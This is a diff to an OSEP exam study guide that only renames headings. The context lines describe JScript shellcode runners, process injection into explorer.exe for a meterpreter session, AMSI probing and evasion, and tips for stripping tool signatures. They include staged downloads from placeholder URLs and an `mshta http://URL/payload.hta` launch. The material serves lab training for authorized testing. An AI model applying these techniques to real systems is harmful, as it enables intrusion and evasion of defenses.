@@ -57,7 +57,7 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
    ```
 5. On a **local / lab target**, validate once with `cscript //nologo runner.js` (see Verify) before delivering.
 
-**Steps**:
+**Procedure**:
 1. Confirm script entry and host bitness (use the host-info section of `m03-wsh-amsi-probe.js`):
    ```bat
    cscript //nologo probe.js        :: prints HOST_ARCH / PROCESSOR_ARCHITECTURE
@@ -437,7 +437,7 @@ try {
 WScript.Quit(0);
 ````
 
-**Verify**: a meterpreter session on the listener means success. For local pre-validation note — `runner.js` activates .NET **inside the process that runs it**: with `cscript //nologo` on a 64-bit host you must use x64 shellcode; if injecting `explorer.exe`, confirm that process exists and matches bitness, otherwise `OpenProcess/CreateRemoteThread` fails silently with no session (script has little echo — judge from the listener).
+**Validation**: a meterpreter session on the listener means success. For local pre-validation note — `runner.js` activates .NET **inside the process that runs it**: with `cscript //nologo` on a 64-bit host you must use x64 shellcode; if injecting `explorer.exe`, confirm that process exists and matches bitness, otherwise `OpenProcess/CreateRemoteThread` fails silently with no session (script has little echo — judge from the listener).
 
 **Failure branches and alternatives**:
 1. Double-click no callback, cscript also no callback → check bitness first: `PROCESSOR_ARCHITECTURE=AMD64` but inject target is a 32-bit process (SysWOW64 explorer or an Office child) fails silently. Fix: inject a same-bitness target (e.g. x64 shellcode + 64-bit `explorer.exe`), or compile the payload AnyCPU and keep shellcode bitness tied to the inject target.
@@ -446,7 +446,7 @@ WScript.Quit(0);
 4. No tool host / no DotNetToJScript.exe → use the SuperSharpShooter path (step 3 alternate); artifact is still a single-file `payload.js`.
 5. Target rejects “attachment scripts” but allows “click a URL” → wrap the same JScript in `mshta http://URL/payload.hta` (see M02).
 
-**Exam notes / OPSEC**:
+**Exam / OPSEC notes**:
 - **Three bitness points must agree**: host process ↔ assembly platform ↔ inject-target bitness. Run `wmic os get osarchitecture` / `echo %PROCESSOR_ARCHITECTURE%` before choosing the payload.
 - Pre-generated artifacts contain tool default strings (`TestClass`, project GUIDs, etc.) — globally replace with neutral names of the same length before delivery.
 - DotNetToJScript runs inside `wscript`; session parent is `wscript.exe` — `migrate` immediately to `explorer`/`svchost`-class processes so closing the window does not kill the session.
@@ -474,7 +474,7 @@ WScript.Quit(0);
    - Stage B (stage 2): DotNetToJScript or SuperSharpShooter artifact, dropped locally then pulled/executed by A; or a second independent attachment.
 3. If you still need “complex content,” regenerate with SuperSharpShooter’s AMSI-related options (see its README evasion flags) — do not hand-write PS-style bypasses.
 
-**Steps**:
+**Procedure**:
 1. Locate the block: write two minimal variants — variant 1 only `WScript.Echo`/download; variant 2 adds only the “load .NET bridge” call on top of variant 1. If 1 works and 2 dies, the block is in the bridge content, not the dropper itself.
 2. Split stage 2: attachment holds only stage A (`m03-simple-dropper.js` download logic, `RUN_AFTER_DOWNLOAD=0`); host `payload.js` (SuperSharpShooter artifact) at `http://URL/payload.js`:
    ```js
@@ -493,7 +493,7 @@ WScript.Quit(0);
 | `m03-supersharpshooter-loader.js` | Split stage-2 load experiment | `STAGE2_JS` |
 | `m03-dotnettojscript-loader.js`, `m03-dotnettojscript-payload.cs` | Bridge artifact container and C# stage 2 | see scenario 9 |
 
-**Verify**: in the probe, the “known signature string” section is BLOCKED while the plain string is PASS → that host has AMSI scanning; design for “more opaque content is better.” Final success criterion is a listener session. The probe itself may pop AV alerts — expected (the probe’s job is to expose the block).
+**Validation**: in the probe, the “known signature string” section is BLOCKED while the plain string is PASS → that host has AMSI scanning; design for “more opaque content is better.” Final success criterion is a listener session. The probe itself may pop AV alerts — expected (the probe’s job is to expose the block).
 
 **Failure branches and alternatives**:
 1. Adding the bridge dies; pure download works → bridge content is what is scanned. Fix: A/B split + new process (step 2); regenerate the bridge with SuperSharpShooter AMSI options.
@@ -502,7 +502,7 @@ WScript.Quit(0);
 4. PS-usable AMSI bypass code errors/no-ops in JScript → do not port it: WSH cannot `Add-Type`/reflect-patch in the same runspace like PS; either use a generator with AMSI handling (SuperSharpShooter options), or change host (mshta/Office, see M01/M02) — do not improvise an in-memory patch on the spot.
 5. Repeated blocks with no location → bisect with the probe (add one chunk only, then the other); decide whether it is a “content signature” or “behavior (network/process)” before changing wrappers.
 
-**Exam notes / OPSEC**:
+**Exam / OPSEC notes**:
 - Scenario 8’s lesson applies: **confirm it is a block, not a timing/lifecycle issue** — after a split download/execute, check whether the file landed and the process started before concluding “killed.”
 - The probe “tries malicious content” on the target and may leave log signatures; use one-shot filenames in the lab; never treat the probe as the final payload.
 - AMSI blocks **dynamic content**, not filenames/icons — do not waste time on disguise filenames; spend effort on “opaque body, segments, change host.”
